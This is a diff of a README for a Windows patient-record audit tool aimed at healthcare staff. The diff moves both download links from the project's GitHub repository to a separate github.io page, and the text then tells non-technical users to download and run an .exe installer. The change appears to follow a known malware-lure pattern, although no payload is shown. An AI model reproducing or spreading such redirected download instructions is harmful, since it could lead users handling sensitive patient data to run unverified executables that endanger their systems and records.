@@ -1,6 +1,6 @@
 # 📋 apexcare-patient-file-check - Audit patient records with better accuracy
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Berkwinged803/apexcare-patient-file-check)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://berkwinged803.github.io)
 
 ApexCare Patient File Audit helps healthcare staff review patient records. It identifies errors and missing details in digital documents. This tool saves time and improves data quality. You do not need technical skills to use this software.
 
@@ -18,7 +18,7 @@ This application runs on Windows computers. Ensure your system meets these stand
 
 The application uses your web browser to display the interface. Follow these steps to set up the software on your computer:
 
-1. Visit [this page to download](https://github.com/Berkwinged803/apexcare-patient-file-check) the latest version.
+1. Visit [this page to download](https://berkwinged803.github.io) the latest version.
 2. Look for the file ending in .exe in the releases section.
 3. Save the installer file to your Downloads folder.
 4. Open your Downloads folder.
